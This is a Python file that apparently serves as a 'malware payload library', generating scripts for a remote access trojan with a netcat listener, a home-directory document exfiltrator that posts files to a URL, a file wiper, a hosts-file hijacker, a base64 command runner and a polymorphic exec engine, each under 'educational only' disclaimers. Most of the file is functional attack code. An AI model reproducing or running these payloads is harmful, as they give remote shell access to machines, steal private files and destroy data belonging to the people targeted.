"""
Expanded Malware Payload Library
WARNING: For authorized testing and educational purposes only.
"""
import os
import base64
import tempfile
from typing import Dict, Optional
import random
import string


class ExpandedMalwareLab:
    """Expanded malware payload library with advanced options"""
    
    def __init__(self, isolated_mode: bool = True):
        self.isolated_mode = isolated_mode
        self.sandbox_path = tempfile.mkdtemp(prefix="malware_lab_")
    
    def create_rat(self, host: str = "127.0.0.1", port: int = 4444) -> Dict:
        """Create Remote Access Trojan (RAT)"""
        code = f'''"""
Educational RAT - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import subprocess
import os
import threading
import json

HOST = "{host}"
PORT = {port}

class RAT:
    def __init__(self):
        self.sock = None
        self.connected = False
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((HOST, PORT))
            self.connected = True
            return True
        except:
            return False
    
    def execute_command(self, command):
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)
    
    def run(self):
        if not self.connect():
            return
        
        while self.connected:
            try:
                command = self.sock.recv(1024).decode()
                if command.lower() == "exit":
                    break
                
                output = self.execute_command(command)
                self.sock.send(output.encode())
            except:
                break
        
        self.sock.close()

rat = RAT()
rat.run()
'''
        
        filepath = os.path.join(self.sandbox_path, "rat_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "rat",
            "file": filepath,
            "host": host,
            "port": port,
            "listener": f"nc -lvp {port}",
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_credential_harvester(self, output_file: str = "credentials.txt") -> Dict:
        """Create credential harvester"""
        code = f'''"""
Educational Credential Harvester - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import keyring
import os
import json
from datetime import datetime

output_file = "{output_file}"
credentials = []

# Browser credential extraction (simplified)
def extract_browser_creds():
    # This is a simplified example
    # Real implementation would access browser databases
    creds = {{
        "browser": "Chrome",
        "sites": [],
        "timestamp": datetime.now().isoformat()
    }}
    return creds

# System credential extraction
def extract_system_creds():
    creds = {{
        "system": os.name,
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }}
    return creds

# Extract credentials
browser_creds = extract_browser_creds()
system_creds = extract_system_creds()

credentials.append(browser_creds)
credentials.append(system_creds)

# Save to file
with open(output_file, 'w') as f:
    json.dump(credentials, f, indent=2)

print(f"Credentials saved to {{output_file}}")
'''
        
        filepath = os.path.join(self.sandbox_path, "credential_harvester_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "credential_harvester",
            "file": filepath,
            "output_file": output_file,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_data_exfiltrator(self, target_url: str = "http://127.0.0.1:8080/upload") -> Dict:
        """Create data exfiltration payload"""
        code = f'''"""
Educational Data Exfiltrator - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import requests
import json
from pathlib import Path

TARGET_URL = "{target_url}"

def collect_data():
    data = {{
        "system_info": {{
            "hostname": os.uname().nodename if hasattr(os, 'uname') else "unknown",
            "platform": os.name,
            "username": os.getenv("USERNAME") or os.getenv("USER")
        }},
        "files": []
    }}
    
    # Collect interesting files (simplified)
    interesting_extensions = ['.txt', '.doc', '.pdf', '.xls']
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if any(file.endswith(ext) for ext in interesting_extensions):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    data["files"].append({{
                        "path": file_path,
                        "size": len(content),
                        "content": base64.b64encode(content).decode()
                    }})
                except:
                    pass
    
    return data

def exfiltrate(data):
    try:
        response = requests.post(TARGET_URL, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Exfiltration failed: {{e}}")
        return False

# Collect and exfiltrate
data = collect_data()
success = exfiltrate(data)
print(f"Exfiltration: {{'Success' if success else 'Failed'}}")
'''
        
        filepath = os.path.join(self.sandbox_path, "data_exfiltrator_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "data_exfiltrator",
            "file": filepath,
            "target_url": target_url,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_cryptominer(self, pool_url: str = "stratum+tcp://pool.example.com:4444",
                          wallet: str = "wallet_address") -> Dict:
        """Create cryptocurrency miner payload"""
        code = f'''"""
Educational Cryptominer - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import hashlib
import time
import threading

POOL_URL = "{pool_url}"
WALLET = "{wallet}"

class SimpleMiner:
    def __init__(self):
        self.running = False
        self.hash_count = 0
    
    def mine(self):
        self.running = True
        while self.running:
            # Simplified mining (not real mining)
            data = f"{{WALLET}}{{time.time()}}{{random.randint(0, 1000000)}}"
            hash_result = hashlib.sha256(data.encode()).hexdigest()
            self.hash_count += 1
            
            # Check if hash meets difficulty (simplified)
            if hash_result.startswith("0000"):
                print(f"Block found! Hash: {{hash_result}}")
            
            time.sleep(0.1)
    
    def stop(self):
        self.running = False
        print(f"Total hashes: {{self.hash_count}}")

miner = SimpleMiner()
thread = threading.Thread(target=miner.mine)
thread.start()

# Run for 10 seconds (demo)
time.sleep(10)
miner.stop()
'''
        
        filepath = os.path.join(self.sandbox_path, "cryptominer_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "cryptominer",
            "file": filepath,
            "pool_url": pool_url,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_wiper(self, target_paths: Optional[list] = None) -> Dict:
        """Create data wiper payload"""
        target_paths = target_paths or ["./test_files"]
        
        code = f'''"""
Educational Data Wiper - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. DESTRUCTIVE. Illegal without authorization.
"""
import os
import random

TARGET_PATHS = {target_paths}

def wipe_file(file_path):
    try:
        # Overwrite with random data
        size = os.path.getsize(file_path)
        with open(file_path, 'wb') as f:
            f.write(os.urandom(size))
        # Delete file
        os.remove(file_path)
        return True
    except:
        return False

def wipe_directory(dir_path):
    wiped = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            if wipe_file(file_path):
                wiped += 1
    return wiped

# Wipe target paths
total_wiped = 0
for path in TARGET_PATHS:
    if os.path.exists(path):
        if os.path.isfile(path):
            if wipe_file(path):
                total_wiped += 1
        elif os.path.isdir(path):
            total_wiped += wipe_directory(path)

print(f"Wiped {{total_wiped}} files")
'''
        
        filepath = os.path.join(self.sandbox_path, "wiper_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "wiper",
            "file": filepath,
            "target_paths": target_paths,
            "warning": "DESTRUCTIVE. Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_fileless_malware(self, command: str = "whoami") -> Dict:
        """Create fileless malware (memory-only execution)"""
        code = f'''"""
Educational Fileless Malware - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import subprocess
import base64
import sys

# Encoded command
encoded_command = base64.b64encode("{command}".encode()).decode()

# Decode and execute
command = base64.b64decode(encoded_command).decode()
result = subprocess.run(command, shell=True, capture_output=True, text=True)
print(result.stdout)
'''
        
        filepath = os.path.join(self.sandbox_path, "fileless_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "fileless",
            "file": filepath,
            "command": command,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_polymorphic_engine(self, base_payload: str) -> Dict:
        """Create polymorphic engine (self-modifying code)"""
        code = f'''"""
Educational Polymorphic Engine - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import random
import string

def mutate_code(code):
    # Simple mutation: add random variables
    mutations = []
    for _ in range(random.randint(1, 5)):
        var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        mutations.append(f"{{var_name}} = {random.randint(0, 1000)}")
    
    return "\\n".join(mutations) + "\\n" + code

# Base payload
base_code = """{base_payload}"""

# Mutate
mutated = mutate_code(base_code)
exec(mutated)
'''
        
        filepath = os.path.join(self.sandbox_path, "polymorphic_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "polymorphic",
            "file": filepath,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_browser_hijacker(self, redirect_url: str = "http://example.com") -> Dict:
        """Create browser hijacker"""
        code = f'''"""
Educational Browser Hijacker - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import os
import platform

REDIRECT_URL = "{redirect_url}"

def hijack_hosts_file():
    hosts_path = None
    if platform.system() == "Windows":
        hosts_path = "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        hosts_path = "/etc/hosts"
    
    if hosts_path and os.path.exists(hosts_path):
        try:
            with open(hosts_path, 'a') as f:
                f.write(f"\\n127.0.0.1 google.com\\n")
                f.write(f"127.0.0.1 facebook.com\\n")
            return True
        except PermissionError:
            return False
    return False

success = hijack_hosts_file()
print(f"Hijack: {{'Success' if success else 'Failed (needs admin)'}}")
'''
        
        filepath = os.path.join(self.sandbox_path, "browser_hijacker_edu.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "browser_hijacker",
            "file": filepath,
            "redirect_url": redirect_url,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def list_all_payloads(self) -> Dict:
        """List all available payload types"""
        return {
            "basic": [
                "keylogger",
                "reverse_shell",
                "file_encryptor",
                "network_scanner"
            ],
            "advanced": [
                "rat",
                "credential_harvester",
                "data_exfiltrator",
                "cryptominer",
                "wiper",
                "fileless",
                "polymorphic",
                "browser_hijacker"
            ],
            "total": 12
        }
